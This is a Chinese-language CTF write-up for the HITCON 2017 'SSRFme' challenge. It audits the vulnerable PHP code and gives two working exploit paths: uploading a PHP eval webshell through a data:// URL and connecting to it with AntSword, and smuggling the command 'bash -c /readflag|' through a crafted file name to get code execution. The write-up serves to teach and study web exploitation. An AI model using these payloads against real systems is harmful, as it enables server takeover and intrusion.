---
title: '[HITCON 2017]SSRFme'
date: 2024-06-08 17:10:13
tags: ssrf
categories: 刷题笔记
---

### [HITCON 2017]SSRFme

打开页面，开始代码审计

<!-- more -->

```
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }
```

获取ip地址并传给 $_SERVER[‘REMOTE_ADDR’]

```
$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);
```

将orange和ip地址转化成md5格式，生成一个唯一的字符串。这个字符串被用来创建一个目录路径，位于 `sandbox/` 目录下。

@mkdir($sandbox);用来创建目录

@chdir($sandbox);用于更改目录

```
$data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

使用`shell_exec`通过GET命令获取URL的数据。解析文件路径信息，创建所需的目录，并将获取的数据通过file_put_contents写入文件

**pathinfo**用来访问文件路径

![image-20240604211315365](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042113406.png)

dir用来检查文件中是否有.，进行过滤

### 非预期解

由于文件中存在file_put_contents，我们考虑伪协议上传一句话木马

```
?url=data://text/plain,<?php eval($_POST[1]);?>&filename=flag.php
```

上传后，我们打开上传目录

先将orange+ip地址进行md5加密（32位小）

![image-20240604212718669](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042127707.png)

ok，上传成功

![image-20240604211921015](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042119056.png)

我们连接蚁剑，连接成功

![image-20240604212028424](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042120576.png)

由于readflag里是一片乱码，我们用虚拟终端打开

![image-20240604212126707](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042121771.png)

得到flag

![image-20240604212249993](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042122043.png)

### 预期解

我们尝试访问根目录，

```
/?url=/&filename=aaa
```

接着访问aaa文件夹，路径:`/sandbox/MD5(orange+ip )/aaa`

![image-20240604213208005](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042132105.png)

我们发现根目录里有flag和readflag

flag应该需要readflag读取

```
?url=&filename=bash -c /readflag| 先新建一个名为“bash -c /readflag|”的文件，用于之后的命令执行

?url=file:bash -c /readflag|&filename=aaa

再利用GET执行bash -c /readflag保存到aaa文件

访问sandbox/md5/aaa（得到flag）
```

![image-20240604213407394](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406042134479.png)
